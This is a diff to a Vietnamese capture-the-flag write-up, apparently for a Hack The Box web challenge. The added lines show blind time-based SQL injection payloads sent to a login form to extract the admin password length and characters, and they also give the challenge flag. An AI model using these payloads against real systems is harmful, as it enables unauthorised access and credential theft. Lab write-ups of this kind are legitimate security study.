@@ -62,6 +62,32 @@ password cần lấy ra có độ dài là 32, tiếp tục ta dùng substring �
 
 Vậy pass của admin là: ichliebedich
 
+Ngoài ra ta có thể dùng sql injection blind time-based để khai thác: 
+
+Test payload lần lượt là: 
+
+test time-based:
+```
+{"username":"admin\" and sleep(5) -- -","password":"12"}
+```
+test độ dài của password: 
+```
+
+{"username":"admin\" and (SELECT CASE WHEN ((select length(password) from users limit 1)=32) THEN sleep(5) ELSE sleep(0) END) -- -","password":"12"}
+
+```
+Tiếp theo thử từng kí tự của password: 
+
+```
+{"username":"admin\" and (SELECT CASE WHEN ((select substring(password,1,1) from users limit 1)>0) THEN sleep(5) ELSE sleep(0) END) -- -","password":"12"}
+
+```
+
+Đợi đến hết rồi mình cũng sẽ được mật khẩu như ở trên: 
+
+![image](https://user-images.githubusercontent.com/104350480/227523675-bb733882-8a01-419e-b962-cdd4f0f1f4a1.png)
+
+
 Đăng nhập thành công, mình vào được trang chủ:
 
 ![image](https://user-images.githubusercontent.com/104350480/227458727-47a507e6-768b-4f8b-8947-63e979dba82d.png)
@@ -81,3 +107,5 @@ File flag.txt được copy và lưu vào nơi có đường dẫn /signal_sleut
 Giờ thực hiện path traversal là có được flag: 
 
 ![image](https://user-images.githubusercontent.com/104350480/227515568-02540e51-ed27-461b-a65c-12fc2222c6eb.png)
+
+> flag: HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}
